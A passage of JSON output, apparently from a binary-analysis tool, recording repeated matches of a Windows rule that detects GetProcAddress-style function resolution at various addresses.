                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651795217
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651795217
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651795281
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651795281
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651795401
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651795401
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796263
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796263
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796314
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796314
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796365
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796365
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796416
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796416
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796467
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796467
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796518
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796518
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796569
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796569
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651796664
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651796664
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651797517
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651797517
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651798897
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651798897
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651798961
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651798961
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799025
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651799025
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799145
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651799145
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799209
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "GetProcAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651799209
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressEx"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "LdrGetProcedureAddressForCaller"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "MmGetSystemRoutineAddress"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651799273
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
